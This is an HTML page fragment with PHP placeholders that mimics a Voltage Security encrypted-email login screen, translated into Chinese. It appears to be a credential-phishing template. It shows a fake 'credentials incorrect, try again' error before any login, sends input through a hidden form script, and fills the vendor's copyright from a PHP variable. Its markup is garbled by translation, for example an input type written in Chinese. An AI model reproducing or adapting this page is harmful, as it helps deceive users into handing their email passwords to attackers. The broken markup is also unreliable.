...
<!-- Copyright 2002-2020 Voltage Security, Inc. -->
...
<body onload="FocusOnElementID('up__X_PASSWORD_TMP')">
                ...
                <table border="0" cellpadding="0" cellspacing="0" align="center">
                  ...
                  <tr>
                    ...
                    <td style="vertical-align:middle">       
                      <ul class="shortcuts">
                          <li>
                            <a href="" target="help"><span style="color: #db0011;">救命</span></a>
                          </li>
                      </ul>
                    </td>
                  </tr>
  ...
  <h2><span style="color: #1c1fce;"><b>登入</b></span></h2>
<span style="color: red;"><div><p>登录凭据不正确。 请再试一遍。</p></div></span>
<form onsubmit="return false;" method="post">
  ...
  <!--[if IE]>  
     <h2>密码</h2>
     <input type="密码" name='up__X_PASSWORD_TMP' id='up__X_PASSWORD_TMP' tabindex='2' 
            value="" maxlength="255" 
  ...
  <!-- <![endif]-->
    ...
    <li class="es_up_submit">
      <button type="button" id='submitButton' name='submitButton' tabindex='3' onClick="return SubmitHiddenForm();" >登入</button>
      ...
      <li>
        ...
        <p class="note">
          <a href="" id="ForgotLink" tabindex='4'><span style="color: #1500db;">忘记密码了吗？</span></a>
        </p>
...
<script src=""></script>
       ...
       <footer class="encrypted" align="center">
        <p>
              提供者的电子邮件加密 <?php echo $yuh ?>         </p>
      </footer>
      
      <footer class="动力的">
          
                <p class="topline">电子邮件安全性 <?php echo $yuh ?>  </p>
          
            <p><p><strong>版权 <?php echo $yuh ?>   2020年。保留所有权利
